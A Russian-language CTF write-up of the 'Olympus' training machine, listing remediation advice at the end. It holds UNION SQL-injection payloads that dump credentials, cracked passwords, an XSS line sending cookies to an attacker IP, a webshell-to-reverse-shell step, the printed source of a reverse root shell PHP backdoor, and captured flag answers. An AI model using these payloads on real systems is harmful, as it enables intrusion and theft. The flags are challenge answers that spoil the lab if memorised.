# Отчёт о проникновении в инфраструктуру Olympus

## Введение

В рамках задания проводилось тестирование на проникновение учебной машины Olympus. Цель — получить доступ к системе, эскалировать привилегии до root и найти все флаги. В отчёте последовательно описаны все этапы работы, включая удачные и неудачные попытки, с пояснениями, почему был выбран тот или иной вектор.

## 1. Первичная разведка (Nmap)

Сканирование выявило два открытых порта:

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Apache редиректит на `http://olympus.thm`. Добавляем домен в `/etc/hosts`. На главной странице — сообщение о том, что старая версия сайта всё ещё доступна на этом домене.

## 2. Фаззинг директорий и файлов

Фаззинг vhosts ничего не дал. Фаззинг директорий выявил:

```
~webmaster           (Status: 200) [Size: 9386]
index.php            (Status: 200) [Size: 1948]
static               (Status: 200) [Size: 1756]
.hta                 (Status: 403)
.htpasswd            (Status: 403)
.htaccess            (Status: 403)
javascript           (Status: 403)
phpmyadmin           (Status: 403)
server-status        (Status: 403)
```

По пути `http://olympus.thm/~webmaster/` обнаружена старая версия сайта.

## 3. SQL-инъекция в поиске

На странице `~webmaster` есть форма поиска, подверженная SQLi. При вводе `search=s'` возникает ошибка:

```
Query FailYou have an error in your SQL syntax; check the manual...
near '%' AND post_status='publish'' at line 1
```

Определение числа столбцов через `ORDER BY`:
- `search=s' order by 11 -- &submit=` — ошибка.
- Значит, столбцов **10**.

Версия MySQL: **8.0.41-0ubuntu0.20.04.1**.

Получение списка таблиц:

```sql
search=s' union select null,null,table_name,null,null,null,null,null,null,null from information_schema.tables -- &submit=
```

Найдены таблицы: `chats`, `flag`, `comments`, `users`.

## 4. Дамп таблицы users

```sql
search=s' union select null,null,concat_ws(':',username,password,email,role),null,null,null,null,null,null,null from users -- &submit=
```

Получены хеши:

```
prometheus::$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:prometheus@olympus.thm:User
root::$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK:root@chat.olympus.thm:Admin
zeus::$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC:zeus@chat.olympus.thm:User
```

Это bcrypt-хеши (`$2y$10$`). Попытка взломать их через hashcat/rockyou с первого раза успеха не дала.

## 5. Флаг в таблице flag

```sql
search=s' union select null,null,flag,null,null,null,null,null,null,null from flag -- &submit=
```

Получен первый флаг:

```
flag{Sm4rt!_k33P_d1gGIng}
```

## 6. Таблица chats

В таблице `chats` найдена запись:

```
Attached : prometheus_password.txt:47c3210d51761686f3af40a875eeaaea.txt:prometheus
This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...::prometheus
```

Это подсказка: файл `prometheus_password.txt` с хешем `47c3210d51761686f3af40a875eeaaea` (MD5). Попытка определить директорию с файлами через фаззинг успеха не дала.

## 7. Взлом хеша prometheus

Со второй попытки удалось взломать bcrypt-хеш `prometheus`:

```
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:summertime
```

Пароль: **`summertime`**. Успешная авторизация в админ-панели под `prometheus`. Обнаружен новый сабдомен: **`chat.olympus.thm`**.

## 8. Вход в чат

Успешная авторизация в чате под `prometheus`. В чате есть возможность загрузки файла. Чат подвержен XSS-уязвимости:

```html
<script>fetch("http://192.168.187.139:8888/?c="+document.cookie)</script>
```

Попытка получить куки пользователя `zeus` через XSS успеха не дала (zeus не открывает сообщения).

## 9. Поиск директории uploads

Фаззинг `http://chat.olympus.thm/home.php` выявил директорию `uploads`. В ней найден файл:

```
http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt
```

Содержимое:

```
you really thought it would be this easy ?!
```

Это отвлекающий файл, не пароль.

## 10. Загрузка webshell и получение shell

При загрузке webshell имя файла меняется (становится случайным хешем). Узнать новое имя можно через SQLi в таблице `chats`:

```
webshell.php:e5f8c1734603fe144b82695a4fe4d959.php
```

Webshell загружен, получен reverse shell под пользователем `www-data`. Прочитан файл `/home/zeus/zeus.txt`:

```
Hey zeus !
I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.
- Prometheus.
```

## 11. Эскалация до zeus через cputils

Найден SUID-бинарь `/usr/bin/cputils`, который копирует файлы. С его помощью скопирован приватный SSH-ключ `zeus` из `/home/zeus/.ssh/id_rsa`. Парольная фраза ключа взломана через john:

```
snowflake
```

Получен доступ по SSH под `zeus`:

```
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

## 12. Поиск бэкдора

В `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/` найден подозрительный файл `VIGQFQFMYOST.php`:

```php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
/lib/defended/libc.so.99
```

Вызов `/lib/defended/libc.so.99` даёт root:

```
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
```

## 13. Последний флаг

Подсказка: «Prometheus left a hidden flag, try and find it! I recommend logging as root over ssh to look for it ;) (Hint: regex can be useful)».

Поиск через `grep -r 'flag{' / 2>/dev/null` выявил файл `/etc/ssl/private/.b0nus.fl4g`:

```
flag{Y0u_G0t_m3_g00d!}
```

## Цепочка атаки

1. Nmap → 22 (SSH), 80 (Apache).
2. Фаззинг → `~webmaster` (старая версия сайта).
3. SQLi в поиске → дамп таблиц `users`, `flag`, `chats`.
4. Флаг из таблицы `flag` → `flag{Sm4rt!_k33P_d1gGIng}`.
5. Подсказка в `chats` → MD5-хеш файла `prometheus_password.txt`.
6. Взлом bcrypt-хеша `prometheus` → `summertime`.
7. Вход в чат `chat.olympus.thm` → XSS (не сработал).
8. Фаззинг → `/uploads/` → отвлекающий файл.
9. Загрузка webshell → имя через SQLi в `chats` → reverse shell под `www-data`.
10. SUID `cputils` → кража `id_rsa` zeus → взлом `snowflake` → SSH под `zeus`.
11. Бэкдор `VIGQFQFMYOST.php` → `/lib/defended/libc.so.99` → root.
12. Поиск флага через `grep -r` → `/etc/ssl/private/.b0nus.fl4g` → `flag{Y0u_G0t_m3_g00d!}`.


## Рекомендации

1. Параметризовать SQL-запросы (PreparedStatement).
2. Использовать стойкие пароли для сервисных учёток.
3. Экранировать вывод в чате (защита от XSS).
4. Не использовать SUID-бинари с функцией копирования.
5. Хранить SSH-ключи с надёжными парольными фразами.
6. Удалить бэкдоры и проверить систему на скрытые SUID-файлы.
7. Не хранить флаги в общедоступных местах.

## Заключение

Задание пройдено полностью. Цепочка атаки: SQLi → дамп БД → взлом bcrypt → вход в чат → загрузка webshell → reverse shell → SUID cputils → SSH-ключ zeus → бэкдор libc.so.99 → root → бонусный флаг. Ключевые ошибки: SQLi, слабые пароли, SUID-бинарь для копирования и скрытый бэкдор. Все шаги выполнены в логике реального атакующего, с фиксацией неудачных попыток (XSS, фаззинг uploads). Цель достигнута — все флаги получены.